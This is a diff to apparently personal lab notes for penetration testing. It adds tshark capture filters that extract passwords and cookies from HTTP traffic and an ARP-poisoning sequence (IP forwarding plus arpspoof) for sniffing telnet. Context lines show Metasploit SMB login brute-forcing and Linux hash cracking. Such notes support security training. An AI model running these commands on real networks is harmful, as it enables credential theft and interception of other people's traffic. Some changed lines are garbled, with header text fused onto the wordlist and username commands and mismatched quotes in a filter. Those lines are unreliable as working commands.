@@ -182,8 +182,8 @@ cat flag
 ```
 msfconsole
 use auxiliary/scanner/smb/smb_login
-set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
-set SMBUser jane
+set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txtGetting Started: Tshark
+set SMBUser janeGetting Started: Tshark
 set RHOSTS 192.212.251.3
 exploit
 gzip -d /usr/share/wordlists/rockyou.txt.gz
@@ -771,6 +771,40 @@ use auxiliary/analyze/crack_linux
 set SHA512 true
 run
 
+```
+
+41) Getting Started: Tshark
+
+```
+tshark -v
+tshark -D
+tshark -i eth0
+tshark -r HTTP_traffic.pcap
+tshark -r HTTP_traffic.pcap | wc -l
+tshark -r HTTP_traffic.pcap -c 100
+tshark -r HTTP_traffic.pcap -z io,phs -q
+```
+42) Filtering Basics: HTTP
+
+```
+tshark -Y ‘http’ -r HTTP_traffic.pcap
+tshark -r HTTP_traffic.pcap -Y "ip.src==192.168.252.128 && ip.dst==52.32.74.91"
+tshark -r HTTP_traffic.pcap -Y "http.request.method==GET"
+tshark -r HTTP_traffic.pcap -Y "http.request.method==GET" -Tfields -e frame.time -e ip.src -e http.request.full_uri
+tshark -r HTTP_traffic.pcap -Y "http contains password”
+tshark -r HTTP_traffic.pcap -Y "http.request.method==GET && http.host==www.nytimes.com" -Tfields -e ip.dst
+tshark -r HTTP_traffic.pcap -Y "ip contains amazon.in && ip.src==192.168.252.128" -Tfields -e ip.src -e http.cookie
+tshark -r HTTP_traffic.pcap -Y "ip.src==192.168.252.128 && http" -Tfields -e http.user_agent
+```
+
+43) ARP Poisoning
+
+```
+ip addr
+nmap 10.100.13.0/24
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i eth1 -t 10.100.13.37 -r 10.100.13.36
+open wireshark and filter telnet
 ```
 
 
